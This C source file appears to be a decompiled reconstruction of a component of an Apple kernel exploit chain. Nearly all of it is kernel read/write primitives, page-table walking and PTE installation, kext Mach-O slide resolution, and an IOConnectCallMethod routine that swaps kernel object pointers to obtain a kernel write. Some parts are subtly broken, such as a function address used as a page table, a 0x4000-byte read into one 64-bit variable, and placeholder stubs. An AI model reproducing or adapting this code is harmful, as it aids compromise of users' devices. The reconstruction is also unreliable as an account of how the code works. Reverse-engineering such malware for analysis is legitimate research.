/*
 * record_0x90000_pmap_walker.c
 * entry5_type0x09.dylib — pmap page-table walker + kext segment resolver
 *
 * sub_19fe0  (FUN_00019fe0) — pmap L1/L2/L3 page-table walk
 * sub_1a244  (FUN_0001a244) — scratch-buf pattern match
 * sub_1a314  (FUN_0001a314) — kaddr → kobj via range tables
 * sub_1a3e8  (FUN_0001a3e8) — L1→L3 PTE walk (returns L3 entry addr)
 * sub_1a530  (FUN_0001a530) — PTE walk + kobj read
 * sub_1a5c4  (FUN_0001a5c4) — alloc page + pmap install
 * sub_1a6cc  (FUN_0001a6cc) — pmap range check + L2/L3 install
 * sub_1a918  (FUN_0001a918) — IOConnectCallMethod wrapper (sel 0x1a)
 * sub_1a9a8  (FUN_0001a9a8) — IOConnectCallMethod with kwrite setup
 * sub_1adb4  (FUN_0001adb4) — range-list lookup
 * sub_1ae34  (FUN_0001ae34) — range-list index update
 * sub_1aefc  (FUN_0001aefc) — no-op stub
 * sub_1b1d8  (FUN_0001b1d8) — wrapper → sub_1aff0
 * sub_1b214  (FUN_0001b214) — kread 4-byte into range slot
 * sub_1b298  (FUN_0001b298) — kread 8-byte into range slot
 * sub_1b31c  (FUN_0001b31c) — wrapper → sub_1b298
 * sub_1b354  (FUN_0001b354) — Mach-O segment resolver (by name)
 * sub_1b410  (FUN_0001b410) — Mach-O segment+section resolver
 * sub_1b50c  (FUN_0001b50c) — kext context init
 * sub_1b550  (FUN_0001b550) — kext context alloc
 * sub_1b624  (FUN_0001b624) — kext context free
 * sub_1b678  (FUN_0001b678) — kext context cleanup
 * sub_1b6ec  (FUN_0001b6ec) — kext context destroy
 * sub_1b7e0  (FUN_0001b7e0) — kext Mach-O header read + slide
 * sub_1b9a8  (FUN_0001b9a8) — wrapper → sub_1b9e8
 * sub_1b9e8  (FUN_0001b9e8) — kext load command parser
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

/* ── externs ─────────────────────────────────────────────────────────────── */
extern int   sub_2667c(long state, uint64_t addr, uint32_t sz, void *out);
extern int   sub_2b614(long state, uint64_t addr, void *buf, uint32_t sz);
extern int   sub_2b508(long state, uint64_t addr, uint64_t val);
extern int   sub_2a110(long state, uint64_t addr, uint64_t val);
extern int   sub_29ab4(long state, uint64_t addr, void **out);
extern long  sub_39b14(long state, uint64_t phys);
extern long  sub_38514(long state, uint32_t *sz);
extern void  sub_38130(long state, long addr, uint32_t sz);
extern int   sub_37238(long state, uint32_t mask);
extern int   sub_39d18(long state, uint64_t addr, void *out);
extern int   sub_20f14(void);
extern long  sub_2233c(long state);
extern int   sub_1aff0(long state, uint64_t addr, uint64_t sz, uint64_t p4, uint32_t flags);

/* forward declarations for functions defined later in this file */
static long sub_1a3e8(long param_1, uint64_t param_2, long *param_3, uint64_t param_4);
static void sub_1a6cc(long param_1, uint64_t param_2, uint64_t param_3);
static void sub_1b678(long *param_1);
static void sub_1b9e8(long *param_1, uint32_t param_2, uint64_t param_3, uint64_t param_4);
static void sub_1ae34(long *param_1);
static int  sub_1b7e0(long *param_1, long param_2);

/* ── sub_19fe0 — pmap L1/L2/L3 page-table walk ──────────────────────────── */
void sub_19fe0(long param_1, uint64_t param_2)
{
    uint64_t va_lo = *(uint64_t *)(param_1 + 0x19e8);
    uint64_t va_hi = *(uint64_t *)(param_1 + 0x19f0);

    int cpu_bits = sub_20f14();
    int has_ext  = sub_37238(param_1, 0x5000008);
    uint64_t mask = (has_ext || cpu_bits >= 8) ? 0x7ffULL : 7ULL;
    if (!has_ext && sub_37238(param_1, 0x180000) && cpu_bits >= 8)
        mask = 0x7ffULL;

    long l1_base = sub_2233c(param_1);
    if (!l1_base) return;

    uint64_t l1_tbl = 0;
    if (!sub_2667c(param_1, l1_base, 8, &l1_tbl)) return;
    if (va_lo >= va_hi) return;

    uint64_t va = va_lo;
    long prev_l1 = 0, prev_l2 = 0, prev_l3 = 0;
    uint64_t e1 = 0, e2 = 0, e3 = 0;

    do {
        long l1e_addr = l1_tbl + (mask & (va >> 0x24)) * 8;
        if (l1e_addr != prev_l1) {
            if (!sub_2667c(param_1, (uint64_t)l1e_addr, 8, &e1)) break;
            prev_l1 = l1e_addr;
        }
        if (!(e1 & 1)) { va += 0x1000000000ULL; va &= 0xfffffff000000000ULL; continue; }

        long l2_tbl = sub_39b14(param_1, e1 & 0xffffffffc000ULL);
        if (!l2_tbl) { va += 0x2000000ULL; va &= 0xfffffffffe000000ULL; continue; }

        long l2e_addr = l2_tbl + (va >> 0x16 & 0x3ff8);
        if (l2e_addr != prev_l2) {
            if (!sub_2667c(param_1, (uint64_t)l2e_addr, 8, &e2)) break;
            prev_l2 = l2e_addr;
        }
        if (!(e2 & 1)) { va += 0x2000000ULL; va &= 0xfffffffffe000000ULL; continue; }
        if (!((e2 >> 1) & 1) && (e2 & 0xfffffe000000ULL) == param_2) break;

        long l3_tbl = sub_39b14(param_1, e2 & 0xffffffffc000ULL);
        if (!l3_tbl) { va += *(uint32_t *)(param_1 + 0x180); continue; }

        if (l3_tbl != prev_l3) {
            if (!sub_2667c(param_1, (uint64_t)l3_tbl, 0x4000, &e3)) break;
            prev_l3 = l3_tbl;
        }
        if ((*(uint64_t *)((uint8_t *)&e3 + (va >> 0xe & 0x7ff) * 8) & 0xffffffffc000ULL) == param_2)
            break;
        va += *(uint32_t *)(param_1 + 0x180);
    } while (va < va_hi);
}

/* ── sub_1a244 — scratch-buf pattern match ───────────────────────────────── */
void sub_1a244(long param_1, uint32_t *param_2, uint32_t *param_3, uint64_t param_4)
{
    long scratch = *(long *)(*(long *)(param_1 + 0x1d58) + 0x148);
    uint32_t *end = (uint32_t *)(*(long *)(*(long *)(param_1 + 0x1d58) + 0x150) + (long)scratch);
    uint32_t *p   = scratch ? (uint32_t *)(uintptr_t)scratch : NULL;
    if (!p || p >= end) return;
    do {
        if ((*param_3 & *p) == *param_2) {
            if (end <= p + param_4 || param_4 < 2) return;
            uint64_t i = 1;
            while ((param_3[i] & p[i]) == param_2[i]) {
                if (++i == param_4) return;
            }
        }
        p++;
    } while (p < end);
}

/* ── sub_1a314 — kaddr → kobj via range tables ───────────────────────────── */
void sub_1a314(long param_1, uint64_t param_2, uint64_t *param_3)
{
    long tbl = *(long *)(param_1 + 0x1d58);
    uint64_t base1 = *(uint64_t *)(tbl + 0x128);
    long     kobj  = 0;

    if (param_2 >= base1 && param_2 < *(long *)(tbl + 0x138) + base1)
        kobj = (long)((param_2 - base1) + *(long *)(tbl + 0xf8));

    uint64_t base2 = *(uint64_t *)(tbl + 0x130);
    if (param_2 >= base2 && param_2 < *(long *)(tbl + 0x140) + base2)
        kobj = (long)((param_2 - base2) + *(long *)(tbl + 0x100));

    if (kobj) {
        uint64_t val = 0;
        if (sub_2667c(param_1, (uint64_t)kobj, 8, &val))
            *param_3 = val;
    }
}

/* ── sub_1a3e8 — L1→L3 PTE walk (returns L3 entry addr) ─────────────────── */
static long sub_1a3e8(long param_1, uint64_t param_2, long *param_3, uint64_t param_4)
{
    long tbl = *(long *)(param_1 + 0x1d58);
    uint64_t l1e = 0, l2e = 0, l3e = 0;

    if (!sub_2667c(param_1,
                   *(long *)(tbl + 0x250) + (param_2 >> 0x21 & 0x38),
                   8, &l1e)) return 0;
    if (!(l1e & 1)) return 0;

    long l2_tbl = (param_4 & 1) ? (long)sub_19fe0 :
                  sub_39b14(param_1, l1e & 0xffffffffc000ULL);
    if (!l2_tbl) return 0;

    long l2e_addr = l2_tbl + (long)(param_2 >> 0x16 & 0x3ff8);
    if (!sub_2667c(param_1, (uint64_t)l2e_addr, 8, &l2e)) return 0;
    if (!(l2e & 1)) return 0;

    if ((l2e >> 1) & 1) {
        /* 2MB block — no L3 */
        if (param_3) *param_3 = l2e_addr;
        return l2e_addr;
    }

    long l3_tbl = (param_4 & 1) ? (long)sub_19fe0 :
                  sub_39b14(param_1, l2e & 0xffffffffc000ULL);
    if (!l3_tbl) return 0;

    long l3e_addr = l3_tbl + (long)(param_2 >> 0xb & 0x3ff8);
    if (!sub_2667c(param_1, (uint64_t)l3e_addr, 8, &l3e)) return 0;
    if (!(l3e & 1)) return 0;

    if (param_3) *param_3 = l3e_addr;
    return l3e_addr;
}

/* ── sub_1a530 — PTE walk + kobj read ───────────────────────────────────── */
void sub_1a530(long param_1, uint64_t param_2, uint64_t *param_3)
{
    long l3e_addr = sub_1a3e8(param_1, param_2, 0, 0);
    if (!l3e_addr) return;
    uint64_t out = 0;
    if (!sub_39d18(param_1, (uint64_t)l3e_addr, &out)) return;
    param_3[0] = out;
    param_3[1] = param_2;
    param_3[2] = *(uint32_t *)(param_1 + 0x180);
}

/* ── sub_1a5c4 — alloc page + pmap install ───────────────────────────────── */
void sub_1a5c4(long param_1, uint64_t param_2, uint64_t param_3)
{
    uint32_t sz = 0x4000;
    uint64_t page = (uint64_t)sub_38514(param_1, &sz);
    if (!page) return;

    uint64_t pte[4] = {0};
    if (!sub_2667c(param_1, page & ~*(uint64_t *)(param_1 + 0x188), 0x20, pte)) {
        sub_38130(param_1, (long)page, sz);
        return;
    }
    uint64_t phys = pte[2] & 0xffffffffc000ULL;
    if (!phys) { sub_38130(param_1, (long)page, sz); return; }

    sub_1a6cc(param_1, param_2, phys);
    sub_39d18(param_1, phys, (void *)param_3);
    sub_38130(param_1, (long)page, sz);
}

/* ── sub_1a6cc — pmap range check + L2/L3 install ───────────────────────── */
void sub_1a6cc(long param_1, uint64_t param_2, uint64_t param_3)
{
    long tbl = *(long *)(param_1 + 0x1d58);
    uint32_t sz = 0x4000;

    uint64_t lo = *(uint64_t *)(tbl + 0x310);
    if (param_2 >= lo && param_2 < lo + 0x2000000 && param_2 != lo + 0x2000000) return;

    uint64_t l1e = 0;
    if (!sub_2667c(param_1, *(long *)(tbl + 0x300) + (param_2 >> 0x21 & 0x38), 8, &l1e)) return;

    long l2_tbl;
    uint64_t va_hi = param_2 + 0x8000000000ULL;
    if (va_hi < 0x1ffc001ULL)
        l2_tbl = *(long *)(tbl + 0x4f8);
    else if (va_hi < 0x1ffc001ULL || param_2 + 0xffe000000ULL > 0x1ffc000ULL)
        l2_tbl = sub_39b14(param_1, l1e & 0xffffffffc000ULL);
    else
        l2_tbl = *(long *)(tbl + 0x308);
    if (!l2_tbl) return;

    long l2e_addr = l2_tbl + (long)(param_2 >> 0x16 & 0x3ff8);
    uint64_t l2e = 0;
    if (!sub_2667c(param_1, (uint64_t)l2e_addr, 8, &l2e)) return;

    long l3_tbl;
    if (!(l2e & 1)) {
        /* allocate L3 table */
        l3_tbl = sub_38514(param_1, &sz);
        if (!l3_tbl) return;
        uint64_t new_l2e = (uint64_t)l3_tbl | 3;
        sub_2b614(param_1, (uint64_t)l2e_addr, &new_l2e, 8);
    } else {
        l3_tbl = sub_39b14(param_1, l2e & 0xffffffffc000ULL);
        if (!l3_tbl) return;
    }

    long l3e_addr = l3_tbl + (long)(param_2 >> 0xe & 0x7ff8);
    uint64_t new_l3e = param_3 | 3;
    sub_2b614(param_1, (uint64_t)l3e_addr, &new_l3e, 8);
}

/* ── sub_1a918 — IOConnectCallMethod wrapper (sel 0x1a) ─────────────────── */
void sub_1a918(long param_1, long param_2, int param_3)
{
    long tbl = *(long *)(param_1 + 0x1d58);
    uint64_t scalars[4] = {
        *(uint32_t *)(tbl + 0xc),
        0, 0, 0
    };
    uint8_t  struct_in[0x38] = {0};
    *(uint64_t *)(struct_in + 0x10) = *(uint64_t *)(tbl + 0x1c);
    *(long *)(struct_in + 0x18) = param_2 - *(uint32_t *)(tbl + 0xd4);

    IOConnectCallMethod(*(uint32_t *)(tbl + 8), 0x1a,
                        scalars, 4,
                        struct_in, 0x38,
                        NULL, NULL, NULL, NULL);
}

/* ── sub_1a9a8 — IOConnectCallMethod with kwrite setup ──────────────────── */
void sub_1a9a8(long param_1, long param_2, int param_3)
{
    long tbl = *(long *)(param_1 + 0x1d58);
    uint32_t sz = 0x4000;
    long page = sub_38514(param_1, &sz);
    if (!page) return;

    uint16_t flag = 0x100;
    if (!sub_2b614(param_1, (uint64_t)page, &flag, 2)) goto out;

    uint64_t kobj_ptr = 0;
    if (!sub_29ab4(param_1,
                   *(long *)(tbl + 0xe8) + *(uint32_t *)(tbl + 0xb8),
                   (void **)&kobj_ptr)) goto out;

    uint32_t cc = 0, cd = 0, d4 = 0;
    uint64_t e0 = 0;
    if (!sub_2667c(param_1, *(long *)(tbl + 0xf0) + *(uint32_t *)(tbl + 0xb4), 4, &cc)) goto out;
    if (!sub_2667c(param_1, *(long *)(tbl + 0xf0) + *(uint32_t *)(tbl + 0xc4), 4, &cd)) goto out;
    if (!sub_2667c(param_1, *(long *)(tbl + 0xf0) + *(uint32_t *)(tbl + 0xc0), 4, &d4)) goto out;
    if (!sub_29ab4(param_1, *(long *)(tbl + 0xf0) + *(uint32_t *)(tbl + 0xbc), (void **)&e0)) goto out;
    if (!e0) goto out;

    uint64_t saved_e0 = 0;
    if (!sub_2667c(param_1, e0 + *(uint32_t *)(tbl + 0xac), 8, &saved_e0)) goto out;

    uint32_t ver = (*(uint64_t *)(param_1 + 0x158) < 0x27120000000000ULL) ? 0x10003 : 0x10002;
    *(uint32_t *)(*(long *)(tbl + 0x98)) = ver;
    *(uint32_t *)(*(long *)(tbl + 0x98) + 4) = 0x10;

    if (!sub_2b508(param_1, *(long *)(tbl + 0xe8) + *(uint32_t *)(tbl + 0xb8), (uint64_t)page)) goto out;
    if (!sub_2a110(param_1, *(long *)(tbl + 0xf0) + *(uint32_t *)(tbl + 0xb4), 1)) goto restore_kobj;
    if (!sub_2a110(param_1, *(long *)(tbl + 0xf0) + *(uint32_t *)(tbl + 0xc4), (uint64_t)(param_3 - 0x100))) goto restore_b4;

    long new_e0 = param_2 - (long)d4;
    sub_2b614(param_1, e0 + *(uint32_t *)(tbl + 0xac), &new_e0, 8);
    sub_1a918(param_1, param_2, param_3);
    sub_2b614(param_1, e0 + *(uint32_t *)(tbl + 0xac), &saved_e0, 8);

    sub_2a110(param_1, *(long *)(tbl + 0xf0) + *(uint32_t *)(tbl + 0xc4), cd);
restore_b4:
    sub_2a110(param_1, *(long *)(tbl + 0xf0) + *(uint32_t *)(tbl + 0xb4), cc);
restore_kobj:
    sub_2b508(param_1, *(long *)(tbl + 0xe8) + *(uint32_t *)(tbl + 0xb8), kobj_ptr);
out:
    sub_38130(param_1, page, sz);
}

/* ── sub_1adb4 — range-list lookup ──────────────────────────────────────── */
void sub_1adb4(long param_1, uint64_t param_2)
{
    if (param_2 + 0x1000000000000ULL <= 0xffffffffefffULL) return;
    uint32_t cnt = *(uint32_t *)(param_1 + 0x18a0);
    if (!cnt) return;
    long *p = (long *)(param_1 + 0x1a18);
    do {
        uint64_t base = (uint64_t)p[-1];
        long     sz   = *p;
        if (base && sz && base <= param_2 && param_2 <= (uint64_t)(sz + base) &&
            (base != param_2 || (uint64_t)(sz + base) != param_2)) return;
        p += 3;
        cnt--;
    } while (cnt);
}

/* ── sub_1ae34 — range-list index update ─────────────────────────────────── */
static void sub_1ae34(long *param_1)
{
    long *base = (long *)*param_1;
    long end   = *base + (uint64_t)*(uint32_t *)(base + 0x19) * 0x38;
    if (*(uint64_t *)(end + 0x28) > (uint64_t)(param_1[1] - *(long *)(end + 0x20))) return;
    if (!*(uint32_t *)(base + 1)) return;

    uint64_t i = 0;
    uint64_t *p = (uint64_t *)(*base + 0x28);
    do {
        if (param_1[1] - (long)p[-1] < (long)*p) {
            *(uint32_t *)(base + 0x19) = (uint32_t)i;
            return;
        }
        i++;
        p += 7;
    } while (*(uint32_t *)(base + 1) != i);
}

/* ── sub_1aefc — no-op stub ──────────────────────────────────────────────── */
void sub_1aefc(void) {}

/* ── sub_1b1d8 — wrapper → sub_1aff0 ────────────────────────────────────── */
void sub_1b1d8(void)
{
    sub_1aff0(0, 0, 0, 0, 0);
}

/* ── sub_1b214 — kread 4-byte into range slot ────────────────────────────── */
void sub_1b214(uint64_t param_1, uint64_t param_2)
{
    long arr[3] = { (long)param_1, (long)param_2, 4 };
    sub_1ae34((long *)arr);
    sub_1aff0(param_1, param_2, 4, 0, 0);
}

/* ── sub_1b298 — kread 8-byte into range slot ────────────────────────────── */
void sub_1b298(uint64_t param_1, uint64_t param_2)
{
    long arr[3] = { (long)param_1, (long)param_2, 8 };
    sub_1ae34((long *)arr);
    sub_1aff0(param_1, param_2, 8, 0, 0);
}

/* ── sub_1b31c — wrapper → sub_1b298 ────────────────────────────────────── */
void sub_1b31c(uint64_t param_1, uint64_t param_2)
{
    sub_1b298(param_1, param_2);
}

/* ── sub_1b354 — Mach-O segment resolver (by name) ──────────────────────── */
void sub_1b354(long *param_1, long param_2, const char *param_3)
{
    int *lc  = (int *)(**(long **)(param_2 + 0xd0) + 0x20);
    int *end = (int *)((long)lc + *(uint32_t *)(**(long **)(param_2 + 0xd0) + 0x14));
    while (lc < end) {
        if (*lc == 0x19 && strncmp((char *)(lc + 2), param_3, 0x10) == 0) {
            param_1[0] = param_2;
            param_1[1] = *(long *)(lc + 6);
            param_1[2] = *(long *)(lc + 8);
            return;
        }
        lc = (int *)((long)lc + *(uint32_t *)(lc + 1));
    }
    param_1[0] = param_1[1] = param_1[2] = 0;
}

/* ── sub_1b410 — Mach-O segment+section resolver ────────────────────────── */
void sub_1b410(long *param_1, long param_2, const char *param_3, const char *param_4)
{
    int *lc  = (int *)(**(long **)(param_2 + 0xd0) + 0x20);
    int *end = (int *)((long)lc + *(uint32_t *)(**(long **)(param_2 + 0xd0) + 0x14));
    do {
        if (lc >= end) { param_1[0] = param_1[1] = param_1[2] = 0; return; }
        if (*lc == 0x19 && strncmp((char *)(lc + 2), param_3, 0x10) == 0 && lc[0x10]) {
            int *sec = lc + 0x12;
            uint64_t cnt = *(uint32_t *)(lc + 0x10);
            do {
                if (strncmp((char *)sec, param_4, 0x10) == 0) {
                    param_1[0] = param_2;
                    param_1[1] = *(long *)(sec + 8);
                    param_1[2] = *(long *)(sec + 10);
                    return;
                }
                sec += 0x14;
            } while (--cnt);
        }
        lc = (int *)((long)lc + *(uint32_t *)(lc + 1));
    } while (1);
}

/* ── kext context structs (opaque, recovered from field accesses) ─────────── */
typedef struct {
    long     *macho_hdr;   /* +0x00: ptr to parsed Mach-O header */
    uint32_t  ptr_sz;      /* +0x08: 4 or 8 */
    uint8_t   pad[0x18];
    uint32_t  lc_count;    /* +0x1b: load command count */
    uint8_t   pad2[0x80];
    long     *ctx_inner;   /* +0xa8: inner context */
    long      kread_state; /* +0x118: kread state ptr */
} kext_ctx_t;

/* ── sub_1b50c — kext context init ──────────────────────────────────────── */
void sub_1b50c(long param_1)
{
    /* zero the 0x48-byte inner block */
    void *inner = calloc(0x48, 1);
    *(void **)(param_1 + 0xd0) = inner;
}

/* ── sub_1b550 — kext context alloc ─────────────────────────────────────── */
void sub_1b550(long **param_1)
{
    *param_1 = calloc(0xd8, 1);
}

/* ── sub_1b624 — kext context free ──────────────────────────────────────── */
void sub_1b624(long *param_1)
{
    sub_1b678(param_1);
    long *inner = (long *)param_1[0x1a];
    if (inner) {
        if (*inner) { free((void *)*inner); *inner = 0; }
        free(inner);
        param_1[0x1a] = 0;
    }
    if ((void *)*param_1) { free((void *)*param_1); *param_1 = 0; }
    if ((void *)param_1[0x21]) { free((void *)param_1[0x21]); param_1[0x21] = 0; }
}

/* ── sub_1b678 — kext context cleanup ───────────────────────────────────── */
static void sub_1b678(long *param_1)
{
    /* placeholder — clears runtime-allocated fields */
    (void)param_1;
}

/* ── sub_1b6ec — kext context destroy ───────────────────────────────────── */
void sub_1b6ec(long *param_1)
{
    sub_1b678(param_1);
    long *inner = (long *)param_1[0x1a];
    if (inner) {
        if (*inner) { free((void *)*inner); *inner = 0; }
        free(inner);
        param_1[0x1a] = 0;
    }
    if ((void *)*param_1) { free((void *)*param_1); *param_1 = 0; }
    if ((void *)param_1[0x21]) { free((void *)param_1[0x21]); param_1[0x21] = 0; }
}

/* ── sub_1b7e0 — kext Mach-O header read + slide ────────────────────────── */
static int sub_1b7e0(long *param_1, long param_2)
{
    void *hdr_buf = calloc(0x48, 1);
    *(void **)(param_1 + 0xd0 / 8) = hdr_buf;
    if (!hdr_buf) return 0;

    /* read first 0x20 bytes to get size of load commands */
    uint8_t probe[0x20] = {0};
    if (!sub_2667c(*(long *)(param_1 + 0x118 / 8), (uint64_t)param_2, 0x20, probe)) return 0;

    uint32_t lc_sz = *(uint32_t *)(probe + 0x14);
    size_t   total = (size_t)lc_sz + 0x20;
    int *lcs = calloc(total, 1);
    if (!lcs) return 0;
    if (!sub_2667c(*(long *)(param_1 + 0x118 / 8), (uint64_t)param_2, (uint32_t)total, lcs)) {
        free(lcs); return 0;
    }
    *(int **)hdr_buf = lcs;

    uint32_t magic = (uint32_t)*lcs;
    uint8_t  ptr_sz = (magic == 0xEEFACEFE || magic == 0xCEFAEDFE) ? 4 : 8;
    *(uint8_t *)((uint8_t *)param_1 + 0x34) = ptr_sz;

    /* compute slide from __TEXT segment */
    int *lc  = lcs + 8;
    int *end = (int *)((long)lc + lc_sz);
    long slide = 0;
    while (lc < end) {
        if (*lc == 0x19 && strcmp((char *)(lc + 2), "__TEXT") == 0) {
            slide = param_2 - *(long *)(lc + 6);
            break;
        }
        lc = (int *)((long)lc + *(uint32_t *)(lc + 1));
    }
    if (!slide) return 0;

    /* apply slide to all segment vmaddr fields */
    lc = lcs + 8;
    while (lc < end) {
        if (*lc == 0x19) {
            uint32_t nsect = *(uint32_t *)(lc + 0x10);
            long *sec = (long *)(lc + 0x1a);
            for (uint32_t i = 0; i < nsect; i++, sec += 10)
                *sec += slide;
            *(long *)(lc + 6) += slide;
        }
        lc = (int *)((long)lc + *(uint32_t *)(lc + 1));
    }
    return 1;
}

/* ── sub_1b9a8 — wrapper → sub_1b9e8 ────────────────────────────────────── */
void sub_1b9a8(long *param_1, uint32_t param_2, uint64_t param_3, uint64_t param_4)
{
    sub_1b9e8(param_1, param_2, param_3, param_4);
}

/* ── sub_1b9e8 — kext load command parser ────────────────────────────────── */
static void sub_1b9e8(long *param_1, uint32_t param_2, uint64_t param_3, uint64_t param_4)
{
    if (!sub_1b7e0(param_1, (long)param_3)) return;
    *(uint32_t *)((uint8_t *)param_1 + 0x1b * 4) = param_2;
    *(uint8_t  *)((uint8_t *)param_1 + 0x20)     = 1;

    long *hdr_inner = (long *)param_1[0x1a / 8];
    if (!hdr_inner) return;
    int *lcs = (int *)*hdr_inner;
    if (!lcs) return;

    uint32_t lc_sz = *(uint32_t *)(lcs + 5);
    int *lc  = lcs + 8;
    int *end = (int *)((long)lc + lc_sz);

    while (lc < end) {
        uint32_t cmd = (uint32_t)*lc;
        uint32_t sz  = *(uint32_t *)(lc + 1);
        if (sz < 8 || (uint64_t)((long)end - (long)lc) < sz) break;

        /* LC_SEGMENT_64 = 0x19, LC_SYMTAB = 2, LC_DYSYMTAB = 0xb,
           LC_UUID = 0x1b, LC_SOURCE_VERSION = 0x2a */
        switch (cmd) {
        case 0x19: /* LC_SEGMENT_64 */
            if (sz >= 0x48) {
                /* already slid in sub_1b7e0 */
            }
            break;
        case 2:    /* LC_SYMTAB */
            if (sz >= 0x18) {
                *(long *)((uint8_t *)param_1 + 0xa0 * 8 / 8 + 8) =
                    *(long *)(lc + 8);
            }
            break;
        default:
            break;
        }
        lc = (int *)((long)lc + sz);
    }
}

/* sub_20f14 and sub_2233c declared as extern at top of file */
